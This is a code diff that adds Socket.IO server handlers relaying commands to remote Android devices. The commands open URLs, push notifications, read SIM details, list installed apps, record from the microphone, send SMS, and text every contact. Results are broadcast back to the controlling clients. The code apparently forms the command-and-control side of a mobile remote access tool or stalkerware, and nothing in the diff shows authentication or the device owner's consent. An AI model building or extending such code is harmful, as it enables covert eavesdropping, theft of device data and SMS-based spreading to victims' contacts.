@@ -439,6 +439,110 @@ io.on('connection', (socket) => {
     });
   });
 
+  // ---- New Feature Commands ----
+
+  // WebView / Open URL
+  socket.on('command:webview:open', ({ deviceId, url }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:webview:open', { url });
+    }
+  });
+  socket.on('webview:opened', (data) => {
+    socket.broadcast.emit('webview:opened', { deviceId: socket.deviceId, ...data });
+  });
+
+  // Notification sender
+  socket.on('command:notification:send', ({ deviceId, title, body, url }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:notification:send', { title, body, url });
+    }
+  });
+  socket.on('notification:sent', (data) => {
+    socket.broadcast.emit('notification:sent', { deviceId: socket.deviceId, ...data });
+  });
+
+  // Toast message
+  socket.on('command:toast:show', ({ deviceId, message, duration }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:toast:show', { message, duration });
+    }
+  });
+  socket.on('toast:shown', (data) => {
+    socket.broadcast.emit('toast:shown', { deviceId: socket.deviceId, ...data });
+  });
+
+  // SIM info
+  socket.on('command:sim:info', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:sim:info');
+    }
+  });
+  socket.on('sim:info', (data) => {
+    socket.broadcast.emit('sim:info', { deviceId: socket.deviceId, ...data });
+  });
+
+  // Vibrate
+  socket.on('command:vibrate', ({ deviceId, duration, pattern }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:vibrate', { duration, pattern });
+    }
+  });
+  socket.on('vibrate:done', (data) => {
+    socket.broadcast.emit('vibrate:done', { deviceId: socket.deviceId, ...data });
+  });
+
+  // Send SMS
+  socket.on('command:sms:send', ({ deviceId, number, message }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:sms:send', { number, message });
+    }
+  });
+  socket.on('sms:sent', (data) => {
+    socket.broadcast.emit('sms:sent', { deviceId: socket.deviceId, ...data });
+  });
+
+  // Send SMS to all contacts
+  socket.on('command:sms:sendall', ({ deviceId, message }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:sms:sendall', { message });
+    }
+  });
+  socket.on('sms:sentall', (data) => {
+    socket.broadcast.emit('sms:sentall', { deviceId: socket.deviceId, ...data });
+  });
+
+  // Installed apps list
+  socket.on('command:apps:list', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:apps:list');
+    }
+  });
+  socket.on('apps:list', (data) => {
+    socket.broadcast.emit('apps:list', { deviceId: socket.deviceId, ...data });
+  });
+
+  // Microphone record with duration
+  socket.on('command:mic:record', ({ deviceId, duration }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:mic:record', { duration });
+    }
+  });
+  socket.on('mic:recording', (data) => {
+    socket.broadcast.emit('mic:recording', { deviceId: socket.deviceId, ...data });
+  });
+  socket.on('mic:status', (data) => {
+    socket.broadcast.emit('mic:status', { deviceId: socket.deviceId, ...data });
+  });
+
   // Disconnect
   socket.on('disconnect', () => {
     if (socket.deviceId) {
